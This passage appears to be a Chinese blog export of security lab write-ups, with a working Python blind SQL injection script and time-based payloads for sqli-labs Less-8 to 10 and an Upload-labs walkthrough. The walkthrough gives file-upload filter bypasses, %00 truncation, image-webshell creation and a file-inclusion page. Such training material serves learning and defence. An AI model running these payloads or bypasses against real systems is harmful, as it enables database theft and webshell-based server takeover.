盲注脚本123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199# -*-coding:utf-8-*- \"\"\" @version: @author: giantbranch @file: code_inject.py @time: 2016/5/1 \"\"\" import urllib2import urllib success_str = \"You are in\"getTable = \"users\" index = \"0\"url = \"http://localhost/sqli-labs/Less-8/?id=1\"database = \"database()\"selectDB = \"select database()\"selectTable = \"select table_name from information_schema.tables where table_schema='%s' limit %d,1\" asciiPayload = \"' and ascii(substr((%s),%d,1))&gt;=%d #\"lengthPayload = \"' and length(%s)&gt;=%d #\"selectTableCountPayload = \"'and (select count(table_name) from information_schema.tables where table_schema='%s')&gt;=%d #\" selectTableNameLengthPayloadfront = \"'and (select length(table_name) from information_schema.tables where table_schema='%s' limit \"selectTableNameLengthPayloadbehind = \",1)&gt;=%d #\" # 发送请求，根据页面的返回的判断长度的猜测结果# string:猜测的字符串 payload:使用的payload length：猜测的长度def getLengthResult(payload, string, length): finalUrl = url + urllib.quote(payload % (string, length)) res = urllib2.urlopen(finalUrl) if success_str in res.read(): return True else: return False # 发送请求，根据页面的返回的判断猜测的字符是否正确# payload:使用的payload string:猜测的字符串 pos：猜测字符串的位置 ascii：猜测的asciidef getResult(payload, string, pos, ascii): finalUrl = url + urllib.quote(payload % (string, pos, ascii)) res = urllib2.urlopen(finalUrl) if success_str in res.read(): return True else: return False # 注入def inject(): # 猜数据库长度 lengthOfDBName = getLengthOfString(lengthPayload, database) print \"length of DBname: \" + str(lengthOfDBName) # 获取数据库名称 DBname = getName(asciiPayload, selectDB, lengthOfDBName) print \"current database:\" + DBname # 获取数据库中的表的个数 # print selectTableCountPayload tableCount = getLengthOfString(selectTableCountPayload, DBname) print \"count of talbe:\" + str(tableCount) # 获取数据库中的表 for i in xrange(0,tableCount): # 第几个表 num = str(i) # 获取当前这个表的长度 selectTableNameLengthPayload = selectTableNameLengthPayloadfront + num + selectTableNameLengthPayloadbehind tableNameLength = getLengthOfString(selectTableNameLengthPayload, DBname) print \"current table length:\" + str(tableNameLength) # 获取当前这个表的名字 selectTableName = selectTable%(DBname, i) tableName = getName(asciiPayload, selectTableName ,tableNameLength) print tableName selectColumnCountPayload = \"'and (select count(column_name) from information_schema.columns where table_schema='\"+ DBname +\"' and table_name='%s')&gt;=%d #\" # print selectColumnCountPayload # 获取指定表的列的数量 columnCount = getLengthOfString(selectColumnCountPayload, getTable) print \"table:\" + getTable + \" --count of column:\" + str(columnCount) # 获取该表有多少行数据 dataCountPayload = \"'and (select count(*) from %s)&gt;=%d #\" dataCount = getLengthOfString(dataCountPayload, getTable) print \"table:\" + getTable + \" --count of data: \" + str(dataCount) data = [] # 获取指定表中的列 for i in xrange(0,columnCount): # 获取该列名字长度 selectColumnNameLengthPayload = \"'and (select length(column_name) from information_schema.columns where table_schema='\"+ DBname +\"' and table_name='%s' limit \"+ str(i) +\",1)&gt;=%d #\" # print selectColumnNameLengthPayload columnNameLength = getLengthOfString(selectColumnNameLengthPayload, getTable) print \"current column length:\" + str(columnNameLength) # 获取该列的名字 selectColumn = \"select column_name from information_schema.columns where table_schema='\"+ DBname +\"' and table_name='%s' limit %d,1\" selectColumnName = selectColumn%(getTable, i) # print selectColumnName columnName = getName(asciiPayload, selectColumnName ,columnNameLength) print columnName tmpData = [] tmpData.append(columnName) # 获取该表的数据 for j in xrange(0,dataCount): columnDataLengthPayload = \"'and (select length(\"+ columnName +\") from %s limit \" + str(j) + \",1)&gt;=%d #\" # print columnDataLengthPayload columnDataLength = getLengthOfString(columnDataLengthPayload, getTable) # print columnDataLength selectData = \"select \" + columnName + \" from users limit \" + str(j) + \",1\" columnData = getName(asciiPayload, selectData, columnDataLength) # print columnData tmpData.append(columnData) data.append(tmpData) # print data # 格式化输出数据 # 输出列名 tmp = \"\" for i in xrange(0,len(data)): tmp += data[i][0] + \" \" print tmp # 输出具体数据 for j in xrange(1,dataCount+1): tmp = \"\" for i in xrange(0,len(data)): tmp += data[i][j] + \" \" print tmp # 获取字符串的长度 def getLengthOfString(payload, string): # 猜长度 lengthLeft = 0 lengthRigth = 0 guess = 10 # 确定长度上限，每次增加5 while 1: # 如果长度大于guess if getLengthResult(payload, string, guess) == True: # 猜测值增加5 guess = guess + 5 else: lengthRigth = guess break # print \"lengthRigth: \" + str(lengthRigth) # 二分法查长度 mid = (lengthLeft + lengthRigth) / 2 while lengthLeft &lt; lengthRigth - 1: # 如果长度大于等于mid if getLengthResult(payload, string, mid) == True: # 更新长度的左边界为mid lengthLeft = mid else: # 否则就是长度小于mid # 更新长度的右边界为mid lengthRigth = mid # 更新中值 mid = (lengthLeft + lengthRigth) / 2 # print lengthLeft, lengthRigth # 因为lengthLeft当长度大于等于mid时更新为mid，而lengthRigth是当长度小于mid时更新为mid # 所以长度区间：大于等于 lengthLeft，小于lengthRigth # 而循环条件是 lengthLeft &lt; lengthRigth - 1，退出循环，lengthLeft就是所求长度 # 如循环到最后一步 lengthLeft = 8， lengthRigth = 9时，循环退出，区间为8&lt;=length&lt;9,length就肯定等于8 return lengthLeft # 获取名称def getName(payload, string, lengthOfString): # 32是空格，是第一个可显示的字符，127是delete，最后一个字符 tmp = '' for i in xrange(1,lengthOfString+1): left = 32 right = 127 mid = (left + right) / 2 while left &lt; right - 1: # 如果该字符串的第i个字符的ascii码大于等于mid if getResult(payload, string, i, mid) == True: # 则更新左边界 left = mid mid = (left + right) / 2 else: # 否则该字符串的第i个字符的ascii码小于mid # 则更新右边界 right = mid # 更新中值 mid = (left + right) / 2 tmp += chr(left) # print tmp return tmp def main(): inject()main() Less-9基于时间的GET单引号盲注Less-9源码：12345678910111213141516171819202122232425262728293031323334353637383940414243&lt;?php //including the Mysql connect parameters. include(\"../sql-connections/sqli-connect.php\"); error_reporting(0); // take the variables if(isset($_GET['id'])) &#123; $id=$_GET['id']; //logging the connection parameters to a file for analysis. $fp=fopen('result.txt','a'); fwrite($fp,'ID:'.$id.\"\\\\n\"); fclose($fp); // connectivity $sql=\"SELECT * FROM users WHERE id='$id' LIMIT 0,1\"; $result=mysqli_query($con1, $sql); $row = mysqli_fetch_array($result, MYSQLI_BOTH); if($row) &#123; echo '&lt;font size=\"5\" color=\"#FFFF00\"&gt;'; echo 'You are in...........'; echo \"&lt;br&gt;\"; echo \"&lt;/font&gt;\"; &#125; else &#123; echo '&lt;font size=\"5\" color=\"#FFFF00\"&gt;'; echo 'You are in...........'; //print_r(mysqli_error($con1)); //echo \"You have an error in your SQL syntax\"; echo \"&lt;/br&gt;&lt;/font&gt;\"; echo '&lt;font color= \"#0000ff\" font size= 3&gt;'; &#125; &#125; else &#123; echo \"Please input the ID as parameter with numeric value\";&#125; ?&gt; 输入?id=1后仍与上题无异 时间型盲注和bool型盲注应用场景不同之处在报错的返回上，从less-8我们知道，输入合法时他会返回正常页面“You are in……”，而非法输入时他没有返回任何东西，于是，我们可以根据这个特点跑盲注，通过他不同的返回页面来判断我们匹配的字符是否正确，而在less-9中合法输入与非合法输入它都返回一个页面，就是“You are in…..” 这样，我们就不能根据他页面的返回内容来判断匹配结果了，因此我们需要用延时函数sleep()对两种输入进行区分，可以构造如下语句：?id=1’ and if(ascii(substr(database(),1,1))&gt;115,0,sleep(5))–+ 这里的意思是，如果数据库名首字母的ascii码大于115，那么执行sleep(5)，延时5秒，此时标签栏会变成缓冲，于是，我们就可以判断匹配的结果了，盲注脚本与less-8类似，只需要加入sleep函数即可 Less-10 基于时间的双引号盲注把第九题的单引号改为双引号即可?id=1” and if(ascii(substr(database(),1,1))&gt;115,0,sleep(5))–+","categories":[],"tags":[]},{"title":"Upload-labs","slug":"Upload-labs","date":"2019-07-31T00:19:52.000Z","updated":"2019-08-31T06:59:11.497Z","comments":true,"path":"2019/07/31/Upload-labs/","link":"","permalink":"https://ddstick.github.io/2019/07/31/Upload-labs/","excerpt":"","text":"文件上传漏洞练习Upload-labs是一个帮你总结各种类型的上传漏洞的靶场，包括常见的文件上传漏洞项目地址：https://github.com/c0ny1/upload-labs Summary 构造优质上传漏洞Fuzz字典http://www.hacksec.cn/Tools/866.html Pass-01 js检查直接上传php木马，发现前端报错： 在这使用传统的抓包，修改后缀名。是可以上传成功的，但是不是这一关的目的，我们看看源代码分析一波 1234567891011121314151617function checkFile() &#123; var file = document.getElementsByName('upload_file')[0].value; if (file == null || file == \"\") &#123; alert(\"请选择要上传的文件!\"); return false; &#125; //定义允许上传的文件类型 var allow_ext = \".jpg|.png|.gif\"; //提取上传文件的类型 var ext_name = file.substring(file.lastIndexOf(\".\")); //判断上传文件类型是否允许上传 if (allow_ext.indexOf(ext_name + \"|\") == -1) &#123; var errMsg = \"该文件不允许上传，请上传\" + allow_ext + \"类型的文件,当前文件类型为：\" + ext_name; alert(errMsg); return false; &#125;&#125; 可以看到，只是在客户端使用js对不合法图片进行检查，我们可以尝试绕过 如果是前端验证我们可以选择火狐浏览器中的NoScript插件禁用js,这样我们就可以安全的上传 但对于前端的过滤没有必要这么复杂，其实，还可以这样，直接把过滤的函数cheakfile()在上传前删掉，也可以上传成功 或者修改参数 在白名单中加上.php 复制该函数于控制台并回车 随后即可成功上传 Pass-02 验证Content-type本题中使用传统的抓包，单纯修改后缀名是不行的查看源码观察一下： 12345678910111213141516171819$is_upload = false;$msg = null;if (isset($_POST['submit'])) &#123; if (file_exists(UPLOAD_PATH)) &#123; if (($_FILES['upload_file']['type'] == 'image/jpeg') || ($_FILES['upload_file']['type'] == 'image/png') || ($_FILES['upload_file']['type'] == 'image/gif')) &#123; $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH . '/' . $_FILES['upload_file']['name'] if (move_uploaded_file($temp_file, $img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = '上传出错！'; &#125; &#125; else &#123; $msg = '文件类型不正确，请重新上传！'; &#125; &#125; else &#123; $msg = UPLOAD_PATH.'文件夹不存在,请手工创建！'; &#125;&#125; 基础姿势：12345$_FILES[\"file\"][\"name\"] – 被上传文件的名称$_FILES[\"file\"][\"type\"] – 被上传文件的类型$_FILES[\"file\"][\"size\"] – 被上传文件的大小，以字节计$_FILES[\"file\"][\"tmp_name\"] – 存储在服务器的文件的临时副本的名称$_FILES[\"file\"][\"error\"] – 由文件上传导致的错误代码 123456move_uploaded_file(file,newloc) 函数将上传的文件移动到新位置。参数 描述file 必需。规定要移动的文件。newloc 必需。规定文件的新位置。如果 file 不是合法的上传文件，不会出现任何操作，move_uploaded_file() 将返回 false。如果 file 是合法的上传文件，但出于某些原因无法移动，不会出现任何操作，move_uploaded_file() 将返回 false，此外还会发出一条警告。 发现只是对文件类型Content-type进行过虑于是上传xxx.php文件抓包修改content-type为image/jpeg或其他绕过 修改为： 点击Forward发送 Pass-03 黑名单绕过不能上传，但能上传 php.jpg，php.asd 说明是黑名单限制 发现是黑名单判断，服务器端禁止上传’.asp’,’.aspx’,’.php’,’.jsp’后缀的脚本文件其采用的黑名单，php的话有时候php3、php4、php5、phtml、pht这些后缀也是可以被解析的（配置的原因），其他语言也有类似的情况，需要尝试： 上传木马抓包 修改文件名后缀（配置不同，可解析的后缀也不同）： Pass-04 .htaccess绕过上传.htaccess文件需要：|1.mod_rewrite模块开启|2.AllowOverride All| 该题的源码为： 123456789101112131415161718192021222324252627$is_upload = false;$msg = null;if (isset($_POST['submit'])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(\".php\",\".php5\",\".php4\",\".php3\",\".php2\",\"php1\",\".html\",\".htm\",\".phtml\",\".pht\",\".pHp\",\".pHp5\",\".pHp4\",\".pHp3\",\".pHp2\",\"pHp1\",\".Html\",\".Htm\",\".pHtml\",\".jsp\",\".jspa\",\".jspx\",\".jsw\",\".jsv\",\".jspf\",\".jtml\",\".jSp\",\".jSpx\",\".jSpa\",\".jSw\",\".jSv\",\".jSpf\",\".jHtml\",\".asp\",\".aspx\",\".asa\",\".asax\",\".ascx\",\".ashx\",\".asmx\",\".cer\",\".aSp\",\".aSpx\",\".aSa\",\".aSax\",\".aScx\",\".aShx\",\".aSmx\",\".cEr\",\".sWf\",\".swf\"); $file_name = trim($_FILES['upload_file']['name']); $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, '.'); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA $file_ext = trim($file_ext); //收尾去空 if (!in_array($file_ext, $deny_ext)) &#123; $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH.'/'.date(\"YmdHis\").rand(1000,9999).$file_ext; if (move_uploaded_file($temp_file, $img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = '上传出错！'; &#125; &#125; else &#123; $msg = '此文件不允许上传!'; &#125; &#125; else &#123; $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！'; &#125;&#125; 发现同样有黑名单过滤，但是发下有一个文件是没有过滤，也是我们上传过程中经常用到的.htaccess .htaccess重点姿势.htaccess文件(或者”分布式配置文件”）,全称是Hypertext Access(超文本入口)。提供了针对目录改变配置的方法，即，在一个特定的文档目录中放置一个包含一个或多个指令的文件，以作用于此目录及其所有子目录。作为用户，所能使用的命令受到限制。管理员可以通过Apache的AllowOverride指令来设置。 启用.htaccess，需要修改httpd.conf，启用AllowOverride，并可以用AllowOverride限制特定命令的使用。它里面有这样一段代码：AllowOverride None，如果我们把None改成All 笼统地说，.htaccess可以帮我们实现包括：文件夹密码保护、用户自动重定向、自定义错误页面、改变你的文件扩展名、封禁特定IP地址的用户、只允许特定IP地址的用户、禁止目录列表，以及使用其他文件作为index文件等一些功能。 可以通过上传.htaccess文件然后将该文件夹下的所有例如.jpg的文件都按照脚本语言解析，上传如下内容的.htaccess文件： 意思是将文件夹下的one.jpg文件按照php格式去解析，然后再上传一个文件名为one.jpg内容为木马的文件，然后访问，可以执行代码（其中.jpg也可换成test等其他，但其他也需改变） 或 或 这样所有文件都会解析为php 上传成功后，在上传个图片马： 发现成功上传，可以访问一下，发现成功执行： Pass-05 大小写绕过——Windows拿源码： 1234567891011121314151617181920212223242526$is_upload = false;$msg = null;if (isset($_POST['submit'])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(\".php\",\".php5\",\".php4\",\".php3\",\".php2\",\".html\",\".htm\",\".phtml\",\".pht\",\".pHp\",\".pHp5\",\".pHp4\",\".pHp3\",\".pHp2\",\".Html\",\".Htm\",\".pHtml\",\".jsp\",\".jspa\",\".jspx\",\".jsw\",\".jsv\",\".jspf\",\".jtml\",\".jSp\",\".jSpx\",\".jSpa\",\".jSw\",\".jSv\",\".jSpf\",\".jHtml\",\".asp\",\".aspx\",\".asa\",\".asax\",\".ascx\",\".ashx\",\".asmx\",\".cer\",\".aSp\",\".aSpx\",\".aSa\",\".aSax\",\".aScx\",\".aShx\",\".aSmx\",\".cEr\",\".sWf\",\".swf\",\".htaccess\"); $file_name = trim($_FILES['upload_file']['name']); $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, '.'); $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA $file_ext = trim($file_ext); //首尾去空 if (!in_array($file_ext, $deny_ext)) &#123; $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH.'/'.date(\"YmdHis\").rand(1000,9999).$file_ext; if (move_uploaded_file($temp_file, $img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = '上传出错！'; &#125; &#125; else &#123; $msg = '此文件类型不允许上传！'; &#125; &#125; else &#123; $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！'; &#125;&#125; 可以看到在第五关代码中没有这个 1$file_ext = strtolower($file_ext); //转换为小写 所以我们可以通过大小写进行绕过了： 抓包： 回显： Pass-06 空格绕过——Windows源码如下： 1234567891011121314151617181920212223242526$is_upload = false;$msg = null;if (isset($_POST['submit'])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(\".php\",\".php5\",\".php4\",\".php3\",\".php2\",\".html\",\".htm\",\".phtml\",\".pht\",\".pHp\",\".pHp5\",\".pHp4\",\".pHp3\",\".pHp2\",\".Html\",\".Htm\",\".pHtml\",\".jsp\",\".jspa\",\".jspx\",\".jsw\",\".jsv\",\".jspf\",\".jtml\",\".jSp\",\".jSpx\",\".jSpa\",\".jSw\",\".jSv\",\".jSpf\",\".jHtml\",\".asp\",\".aspx\",\".asa\",\".asax\",\".ascx\",\".ashx\",\".asmx\",\".cer\",\".aSp\",\".aSpx\",\".aSa\",\".aSax\",\".aScx\",\".aShx\",\".aSmx\",\".cEr\",\".sWf\",\".swf\",\".htaccess\"); $file_name = $_FILES['upload_file']['name']; $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, '.'); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA if (!in_array($file_ext, $deny_ext)) &#123; $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH.'/'.date(\"YmdHis\").rand(1000,9999).$file_ext; if (move_uploaded_file($temp_file,$img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = '上传出错！'; &#125; &#125; else &#123; $msg = '此文件不允许上传'; &#125; &#125; else &#123; $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！'; &#125;&#125; 这一关比第五关少了这样的一句代码 1$file_ext = trim($file_ext); //首尾去空 所以可以后缀名+空格的形式去绕过,抓包 修改： Pass-07 点绕过——Windows源码如下： 1234567891011121314151617181920212223242526$is_upload = false;$msg = null;if (isset($_POST['submit'])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(\".php\",\".php5\",\".php4\",\".php3\",\".php2\",\".html\",\".htm\",\".phtml\",\".pht\",\".pHp\",\".pHp5\",\".pHp4\",\".pHp3\",\".pHp2\",\".Html\",\".Htm\",\".pHtml\",\".jsp\",\".jspa\",\".jspx\",\".jsw\",\".jsv\",\".jspf\",\".jtml\",\".jSp\",\".jSpx\",\".jSpa\",\".jSw\",\".jSv\",\".jSpf\",\".jHtml\",\".asp\",\".aspx\",\".asa\",\".asax\",\".ascx\",\".ashx\",\".asmx\",\".cer\",\".aSp\",\".aSpx\",\".aSa\",\".aSax\",\".aScx\",\".aShx\",\".aSmx\",\".cEr\",\".sWf\",\".swf\",\".htaccess\"); $file_name = trim($_FILES['upload_file']['name']); $file_ext = strrchr($file_name, '.'); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA $file_ext = trim($file_ext); //首尾去空 if (!in_array($file_ext, $deny_ext)) &#123; $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH.'/'.$file_name; if (move_uploaded_file($temp_file, $img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = '上传出错！'; &#125; &#125; else &#123; $msg = '此文件类型不允许上传！'; &#125; &#125; else &#123; $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！'; &#125;&#125; 查看代码发现，大小写，空格，等等都是绕不过的，但是还有一个在后缀名中家点号没有对后缀名进行去”.”处理，利用windows特性，会自动去掉后缀名中最后的”.”，上传后文件名后缀的点会被去除，所以可在后缀名中加”.”绕过，走起： Pass-08 ::$DATA绕过——Windows这一题的代码比上一次少了下面这一段代码 1$file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA 这个是关于windows下文件的流特性，可以参考一下这篇文章https://www.owasp.org/index.php/Windows_::DATA_alternate_data_stream在后缀添加::$DATA 即可绕过上传1.php::$DATA之后会变成1.php NTFS文件系统包括对备用数据流的支持。这不是众所周知的功能，主要包括提供与Macintosh文件系统中的文件的兼容性。备用数据流允许文件包含多个数据流。每个文件至少有一个数据流。在Windows中，此默认数据流称为：$ DATA。 上传xxx.php::$DATA绕过。(仅限windows) Pass-09 点空格点绕过——Windows这一关像是前几关的组合拳，虽然把最后的点给删掉，但是仍然可以绕过，因为这里的过滤并没有递归下去，只是一步，这样就相当于SQL注入里面用str_replace只过滤一次关键字一样 1234567$deny_ext = array(\".php\",\".php5\",\".php4\",\".php3\",\".php2\",\".html\",\".htm\",\".phtml\",\".pht\",\".pHp\",\".pHp5\",\".pHp4\",\".pHp3\",\".pHp2\",\".Html\",\".Htm\",\".pHtml\",\".jsp\",\".jspa\",\".jspx\",\".jsw\",\".jsv\",\".jspf\",\".jtml\",\".jSp\",\".jSpx\",\".jSpa\",\".jSw\",\".jSv\",\".jSpf\",\".jHtml\",\".asp\",\".aspx\",\".asa\",\".asax\",\".ascx\",\".ashx\",\".asmx\",\".cer\",\".aSp\",\".aSpx\",\".aSa\",\".aSax\",\".aScx\",\".aShx\",\".aSmx\",\".cEr\",\".sWf\",\".swf\",\".htaccess\"); $file_name = trim($_FILES['upload_file']['name']); $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, '.'); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA $file_ext = trim($file_ext); //首尾去空 可以遵循着他的步骤去实现自己的payload，可以设置为pass09.php. . 这样一来检测到最后的文件名是pass09.php.，这样就相当于第七关了 Pass-10 双写绕过12345678910111213141516171819$is_upload = false;$msg = null;if (isset($_POST['submit'])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(\"php\",\"php5\",\"php4\",\"php3\",\"php2\",\"html\",\"htm\",\"phtml\",\"pht\",\"jsp\",\"jspa\",\"jspx\",\"jsw\",\"jsv\",\"jspf\",\"jtml\",\"asp\",\"aspx\",\"asa\",\"asax\",\"ascx\",\"ashx\",\"asmx\",\"cer\",\"swf\",\"htaccess\"); $file_name = trim($_FILES['upload_file']['name']); $file_name = str_ireplace($deny_ext,\"\", $file_name); $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH.'/'.$file_name; if (move_uploaded_file($temp_file, $img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = '上传出错！'; &#125; &#125; else &#123; $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！'; &#125;&#125; 关键函数解析123456str_ireplace(find,replace,string,count)参数 描述find 必需。规定要查找的值。replace 必需。规定替换 find 中的值的值。string 必需。规定被搜索的字符串。count 可选。一个变量，对替换数进行计数。 上面的代码依旧是黑名单过滤，这里是将文件后缀名替换为空，只替换了一次 1234567&lt;?php$deny_ext = array(\"php\",\"php5\",\"php4\",\"php3\",\"php2\",\"html\",\"htm\",\"phtml\",\"jsp\",\"jspa\",\"jspx\",\"jsw\",\"jsv\",\"jspf\",\"jtml\",\"asp\",\"aspx\",\"asa\",\"asax\",\"ascx\",\"ashx\",\"asmx\",\"cer\",\"swf\",\"htaccess\");$file_name = str_ireplace($deny_ext,\"\", 'pphphp');var_dump($file_name);#绕过测试代码?&gt; Pass-11 00截断GET方式123456789101112131415161718$is_upload = false;$msg = null;if(isset($_POST['submit']))&#123; $ext_arr = array('jpg','png','gif'); $file_ext = substr($_FILES['upload_file']['name'],strrpos($_FILES['upload_file']['name'],\".\")+1); if(in_array($file_ext,$ext_arr))&#123; $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = $_GET['save_path'].\"/\".rand(10, 99).date(\"YmdHis\").\".\".$file_ext; if(move_uploaded_file($temp_file,$img_path))&#123; $is_upload = true; &#125; else &#123; $msg = '上传出错！'; &#125; &#125; else&#123; $msg = \"只允许上传.jpg|.png|.gif类型文件！\"; &#125;&#125; 关键函数解析1234567891011121314strrpos()定义和用法strrpos() 函数查找字符串在另一字符串中最后一次出现的位置。注释：strrpos() 函数对大小写敏感。相关函数：stripos() - 查找字符串在另一字符串中第一次出现的位置（不区分大小写）strpos() - 查找字符串在另一字符串中第一次出现的位置（区分大小写）strripos() - 查找字符串在另一字符串中最后一次出现的位置（不区分大小写）语法strrpos(string,find,start)参数 描述string 必需。规定被搜索的字符串。find 必需。规定要查找的字符。start 可选。规定在何处开始搜索。 1234567substr()这里写代码片语法substr(string,start,length)参数 描述string 必需。规定要返回其中一部分的字符串。start 必需。规定在字符串的何处开始。正数 - 在字符串的指定位置开始 负数 - 在从字符串结尾开始的指定位置开始0 - 在字符串中的第一个字符处开始length 可选。规定被返回字符串的长度。默认是直到字符串的结尾。正数 - 从 start 参数所在的位置返回的长度负数 - 从字符串末端返回的长度 test: 123456&lt;?php$a = '1.jpg';$file_ext = substr($a,strrpos($a,\".\")+1);var_dump($file_ext);?&gt;返回jpg 分析代码： 1$img_path = $_GET['save_path'].\"/\".rand(10,99).date(\"YmdHis\").\".\".$file_ext; 发现那个路径没有处理直接拼接上去的。所以可以利用00截断绕过。但是发现怎么截断都没有用。查阅资料： 123截断条件： php版本小于5.3.4 详情关注CVE-2006-7243 php的magic_quotes_gpc为OFF状态 解决后，抓包 请求中会自动将%00进行url解码，在后台进行拼凑的时候会自动阶段后面的字符串上传成功后的文件名即为你修改的名 补充：在php版本小于5.3.4的服务器中，当Magic_quote_gpc选项为off时，可以在文件名中使用%00截断 Pass-12 00截断POST方式123456789101112131415161718$is_upload = false;$msg = null;if(isset($_POST['submit']))&#123; $ext_arr = array('jpg','png','gif'); $file_ext = substr($_FILES['upload_file']['name'],strrpos($_FILES['upload_file']['name'],\".\")+1); if(in_array($file_ext,$ext_arr))&#123; $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = $_POST['save_path'].\"/\".rand(10, 99).date(\"YmdHis\").\".\".$file_ext; if(move_uploaded_file($temp_file,$img_path))&#123; $is_upload = true; &#125; else &#123; $msg = \"上传失败\"; &#125; &#125; else &#123; $msg = \"只允许上传.jpg|.png|.gif类型文件！\"; &#125;&#125; 该题也是00截断，只不过由于文件路径这个参数是通过post请求发送的，需要抓包后再hex中修改，因为post不会像get对%00进行自动解码 1$img_path = $_POST['save_path'].\"/\".rand(10, 99).date(\"YmdHis\").\".\".$file_ext; save_path 从 GET 变成了 POST, 此时不能再使用 %00 截断, 原因是 %00 截断在 GET 中被 url 解码之后是空字符, 但是在 POST 中 %00 不会被 url 解码, 所以只能通过 burpsuite 修改 hex 值为 00 进行截断.这里把 2b(‘+’的 hex) 修改成 00 或者把 20(‘空格’的hex)修改为00 这里的路径 1.php+或1.php 都可 需自己手动加上 完成发送即可上传 补充：在php版本小于5.3.4的服务器中，当Magic_quote_gpc选项为off时，可以在文件名中使用%00截断 Pass-13 图片马通过上传图片马，再利用本地包含漏洞执行 12345678910111213141516171819202122232425262728293031323334353637383940function getReailFileType($filename)&#123; $file = fopen($filename, \"rb\"); $bin = fread($file, 2); //只读2字节 fclose($file); $strInfo = @unpack(\"C2chars\", $bin); $typeCode = intval($strInfo['chars1'].$strInfo['chars2']); $fileType = ''; switch($typeCode)&#123; case 255216: $fileType = 'jpg'; break; case 13780: $fileType = 'png'; break; case 7173: $fileType = 'gif'; break; default: $fileType = 'unknown'; &#125; return $fileType;&#125;$is_upload = false;$msg = null;if(isset($_POST['submit']))&#123; $temp_file = $_FILES['upload_file']['tmp_name']; $file_type = getReailFileType($temp_file); if($file_type == 'unknown')&#123; $msg = \"文件未知，上传失败！\"; &#125;else&#123; $img_path = UPLOAD_PATH.\"/\".rand(10, 99).date(\"YmdHis\").\".\".$file_type; if(move_uploaded_file($temp_file,$img_path))&#123; $is_upload = true; &#125; else &#123; $msg = \"上传出错！\"; &#125; &#125;&#125; 发现主要是取上传文件的头两个字节判断文件类型，因此直接上传图片马即可图片马制作方法,cmd中执行： 123copy one.jpg /b + one.php /a one.jpg/b:指定二进制格式复制、合并文件，用于图像或者声音类文件/a:指定以ascii格式复制、合并文件，用于txt等文本累文件 或 利用16进制编辑器在图片的编辑栏末尾加上木马 成功上传，而且得到文件的名称。我们后期如果存在文件包含漏洞就可以利用 比如我们简单写一个存在文件包含漏洞的页面: 123456&lt;?php$file = $_GET[ 'page' ];include($file);?&gt; 发现可以成功利用漏洞： Pass-14 图片马getimagsize函数12345678910111213141516171819202122232425262728293031function isImage($filename)&#123; $types = '.jpeg|.png|.gif'; if(file_exists($filename))&#123; $info = getimagesize($filename); $ext = image_type_to_extension($info[2]); if(stripos($types,$ext)&gt;=0)&#123; return $ext; &#125;else&#123; return false; &#125; &#125;else&#123; return false; &#125;&#125;$is_upload = false;$msg = null;if(isset($_POST['submit']))&#123; $temp_file = $_FILES['upload_file']['tmp_name']; $res = isImage($temp_file); if(!$res)&#123; $msg = \"文件未知，上传失败！\"; &#125;else&#123; $img_path = UPLOAD_PATH.\"/\".rand(10, 99).date(\"YmdHis\").$res; if(move_uploaded_file($temp_file,$img_path))&#123; $is_upload = true; &#125; else &#123; $msg = \"上传出错！\"; &#125; &#125;&#125; 关键代码： 1234$types = '.jpeg|.png|.gif'; if(file_exists($filename))&#123; $info = getimagesize($filename); $ext = image_type_to_extension($info[2]); 这里用getimagesize获取文件类型，还是直接就可以利用图片马就可进行绕过， 知识补充点：1234array getimagesize ( string $filename [, array &amp;$imageinfo ] )getimagesize() 函数将测定任何 GIF，JPG，PNG，SWF，SWC，PSD，TIFF，BMP，IFF，JP2，JPX，JB2，JPC，XBM 或 WBMP 图像文件的大小并返回图像的尺寸以及文件类型和一个可以用于普通 HTML 文件中 IMG 标记中的 height/width 文本字符串。如果不能访问 filename 指定的图像或者其不是有效的图像，getimagesize() 将返回 FALSE 并产生一条 E_WARNING 级的错误。 同样用上一关的图片木马进行上传也可成功利用方式和上一关一样，需要文件包含漏洞 Pass-15 